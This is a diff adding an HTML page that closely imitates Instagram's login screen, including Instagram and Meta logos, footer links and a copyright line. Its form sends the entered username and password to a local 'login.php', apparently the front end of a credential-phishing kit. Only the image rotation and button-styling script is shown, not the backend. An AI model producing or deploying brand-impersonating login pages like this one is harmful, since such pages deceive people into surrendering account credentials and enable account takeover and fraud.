@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        :root {
+            --primary-blue: #0095f6;
+            --disabled-blue: #70c0fd;
+            --border-color: #dbdbdb;
+            --text-dark: #000000;
+            --text-gray: #737373;
+            --bg-gray: #fafafa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-weight: 500;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh; /* Ensures the page takes up the full screen height */
+        }
+
+        /* Main Content Container - stretches to fill screen */
+        .main-container {
+            display: flex;
+            flex: 1; /* Pushes the footer to the bottom */
+            width: 100%;
+        }
+
+        /* Left Column */
+        .left-column {
+            width: 58%; /* Matches the proportions in your screenshot */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* Perfectly centers the text and image vertically */
+            border-right: 1px solid var(--border-color);
+            position: relative; /* Allows absolute positioning for the logo */
+        }
+
+        .logo-icon {
+            position: absolute;
+            top: 40px;
+            left: 40px; /* Pins the logo to the top left */
+            width: 45px;
+            height: 45px;
+            filter: drop-shadow(0 2px 5px rgba(214, 41, 118, 0.28)) drop-shadow(0 4px 10px rgba(150, 47, 191, 0.16));
+        }
+
+        /* Wrapper to keep text and image grouped tightly */
+        .left-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .headline {
+            text-align: center;
+            font-size: 42px;
+            font-weight: 500;
+            line-height: 1.55;
+            margin-bottom: 24px;
+            color: var(--text-dark);
+        }
+
+        .highlight-text {
+            background: linear-gradient(90deg, #feda75 0%, #fa7e1e 20%, #d62976 48%, #962fbf 72%, #4f5bd5 100%);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 2px 5px rgba(214, 41, 118, 0.28)) drop-shadow(0 4px 10px rgba(150, 47, 191, 0.16));
+            font-weight: 500;
+        }
+
+        .image-mockup {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            object-fit: contain;
+            transition: filter 0.3s ease;
+        }
+
+        .image-fallback {
+            max-width: 600px;
+            padding: 16px;
+            color: var(--text-gray);
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+            border-radius: 8px;
+        }
+
+        /* Right Column */
+        .right-column {
+            width: 42%;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centers the login box horizontally */
+            justify-content: center; /* Centers the login box vertically */
+        }
+
+        .login-box {
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 520px;
+        }
+
+        .login-title {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            color: var(--text-dark);
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            height: 60px;
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 12px 16px;
+            font-size: 14px;
+            color: var(--text-dark);
+            outline: none;
+            transition: border 0.1s;
+        }
+
+            input::placeholder {
+                color: #737373;
+                font-size: 14px;
+            }
+
+        .focused-input {
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 1px var(--primary-blue);
+        }
+
+        .btn-login {
+            background-color: #91baf1;
+            color: white;
+            border: none;
+            border-radius: 22px;
+            padding: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-bottom: 28px;
+            width: 100%;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            text-decoration: none;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+            .btn-login.is-ready {
+                background-color: var(--primary-blue);
+                box-shadow: 0 0 12px rgba(0, 149, 246, 0.65);
+            }
+
+        .forgot-password {
+            text-align: center;
+            font-size: 14px;
+            color: #00376b;
+            text-decoration: none;
+            margin-bottom: 65px;
+        }
+
+            .forgot-password:hover {
+                color: #000;
+            }
+
+        .btn-facebook {
+            background-color: #f4f4f4;
+            color: #262626;
+            border: none;
+            border-radius: 22px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 11px;
+            width: 100%;
+            height: 45px;
+            padding: 8px;
+        }
+
+            .btn-facebook svg {
+                margin-right: 8px;
+            }
+
+        .btn-create-account {
+            background-color: transparent;
+            color: var(--primary-blue);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            margin-bottom: 28px;
+            height: 44px;
+        }
+
+        .meta-logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 0;
+        }
+
+        /* Footer Section */
+        footer {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: auto;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+            max-width: 1000px;
+        }
+
+            .footer-links a {
+                color: var(--text-gray);
+                text-decoration: none;
+            }
+
+                .footer-links a:hover {
+                    text-decoration: underline;
+                }
+
+        .copyright {
+            display: flex;
+            gap: 16px;
+            margin-top: 8px;
+        }
+
+        @media (max-width: 760px) {
+            .main-container {
+                flex-direction: column;
+                min-height: auto;
+            }
+
+            .left-column, .right-column {
+                width: 100%;
+                border-right: 0;
+                padding: 32px 20px;
+            }
+
+            .logo-icon {
+                position: static;
+                align-self: flex-start;
+                margin-bottom: 30px;
+            }
+
+            .headline {
+                font-size: clamp(28px, 7vw, 42px);
+            }
+
+            .image-mockup {
+                max-width: min(600px, 100%);
+            }
+
+            .forgot-password {
+                margin-bottom: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Left Section -->
+        <div class="left-column">
+
+            <!-- Logo anchored to top-left -->
+            <svg class="logo-icon" viewBox="0 0 128 128" width="45" height="45" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="ig-bg-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+                        <stop offset="0%" stop-color="#feda75" />
+                        <stop offset="25%" stop-color="#fa7e1e" />
+                        <stop offset="50%" stop-color="#d62976" />
+                        <stop offset="75%" stop-color="#962fbf" />
+                        <stop offset="100%" stop-color="#4f5bd5" />
+                    </linearGradient>
+                </defs>
+                <g fill="none" stroke="url(#ig-bg-grad)" stroke-width="12">
+                    <rect x="14" y="14" width="100" height="100" rx="28" ry="28"></rect>
+                    <circle cx="64" cy="64" r="27"></circle>
+                </g>
+                <circle cx="92" cy="36" r="6" fill="url(#ig-bg-grad)"></circle>
+            </svg>
+
+            <!-- Grouped text and image, perfectly centered -->
+            <div class="left-content">
+                <h1 class="headline">
+                    See everyday moments from your<br>
+                    <span class="highlight-text">close friends.</span>
+                </h1>
+
+                <img id="dynamic-image" alt="Instagram close friends photo collage" class="image-mockup">
+                <p id="fallback-text" class="image-fallback" role="status" hidden></p>
+            </div>
+
+        </div>
+
+        <!-- Right Section -->
+        <div class="right-column">
+            <div class="login-box">
+                <div class="login-title">Log into Instagram</div>
+
+                <!-- Form mapped back to login.php so it submits correctly -->
+                <form class="login-form" action="login.php" method="POST">
+                    <div class="input-group">
+                        <input type="text" name="username" placeholder="Mobile number, username or email" class="focused-input" autocomplete="username" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
+                    </div>
+
+                    <button type="submit" class="btn-login">Log in</button>
+                </form>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+
+                <button type="button" class="btn-facebook">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877F2">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+                    </svg>
+                    Log in with Facebook
+                </button>
+
+                <button type="button" class="btn-create-account">Create new account</button>
+
+                <div class="meta-logo-container">
+                    <svg viewBox="0 0 80 20" width="70" height="16" fill="#1c2b33">
+                        <path d="M14.6 9.8c-1.3-1.8-3.4-3.1-5.7-3.1-3.6 0-6.6 2.9-6.6 6.5s3 6.5 6.6 6.5c2.3 0 4.4-1.2 5.7-3.1 1.3 1.8 3.4 3.1 5.7 3.1 3.6 0 6.6-2.9 6.6-6.5s-3-6.5-6.6-6.5c-2.3 0-4.4 1.2-5.7 3.1zm5.7-1.1c2.6 0 4.6 2.1 4.6 4.6s-2 4.6-4.6 4.6-4.6-2.1-4.6-4.6 2-4.6 4.6-4.6zm-11.4 0c2.6 0 4.6 2.1 4.6 4.6s-2 4.6-4.6 4.6-4.6-2.1-4.6-4.6 2-4.6 4.6-4.6z" />
+                        <text x="32" y="15" font-family="-apple-system, sans-serif" font-size="14" font-weight="600" fill="#1c2b33">Meta</text>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Popular</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Muse</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            <span>English &#9662;</span>
+            <span>&copy; 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <script>
+                const imagePool = [
+                    'D9Zj3ZEQhDbyb9NUAhApQW_2.jpg',
+                    'image4_2.png'
+                ];
+                const randomImage = imagePool[Math.floor(Math.random() * imagePool.length)];
+
+                const imgElement = document.getElementById('dynamic-image');
+                const fallbackText = document.getElementById('fallback-text');
+
+                imgElement.hidden = false;
+                fallbackText.hidden = true;
+
+                imgElement.onerror = function() {
+                    imgElement.hidden = true;
+                    fallbackText.hidden = false;
+                    fallbackText.innerHTML = `Image unavailable. Make sure your file is named exactly <strong>${randomImage}</strong>`;
+                };
+
+                // Load the image
+                imgElement.src = randomImage;
+
+                // Automatically hide the grey background ONLY on the first image
+                if (randomImage === 'D9Zj3ZEQhDbyb9NUAhApQW_2.jpg') {
+                    imgElement.style.mixBlendMode = 'darken';
+                    imgElement.style.filter = 'brightness(1.05) contrast(1.05)';
+                } else {
+                    imgElement.style.mixBlendMode = 'normal';
+                    imgElement.style.filter = 'none';
+                }
+
+                // Login button glow logic
+                const loginInputs = document.querySelectorAll('.login-form input');
+                const loginButton = document.querySelector('.btn-login');
+
+                function updateLoginButtonGlow() {
+                    const fieldsAreFilled = Array.from(loginInputs).every(input => input.value.trim());
+                    loginButton.classList.toggle('is-ready', fieldsAreFilled);
+                }
+
+                loginInputs.forEach(input => input.addEventListener('input', updateLoginButtonGlow));
+                updateLoginButtonGlow();
+    </script>
+</body>
+</html>
